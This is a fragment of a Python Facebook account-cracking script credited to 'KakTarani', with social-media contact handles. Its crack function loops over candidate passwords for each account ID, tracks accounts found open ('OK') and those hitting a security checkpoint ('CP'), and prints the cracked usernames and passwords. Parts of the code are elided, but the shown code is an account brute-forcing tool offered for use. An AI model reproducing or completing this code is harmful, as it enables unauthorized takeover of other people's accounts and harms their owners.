...
SNAPCHAT: korshtarani
UPDATED BY: KaᵏTaranⁱ.⁰¹³
TELEGRAM: @KakTarani
---------------------------------------------  
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r 𓊈 KakTarani-V1 𓊉 {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%})'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\n\x1b[1;92m FACEBOOK ✓: \x1b[1;94m{tahun(idf)} \n\x1b[1;92m USERNAME ✓: \x1b[1;94m{idf}\n\x1b[1;92m PASSWORD ✓: \x1b[1;94m{pw}')
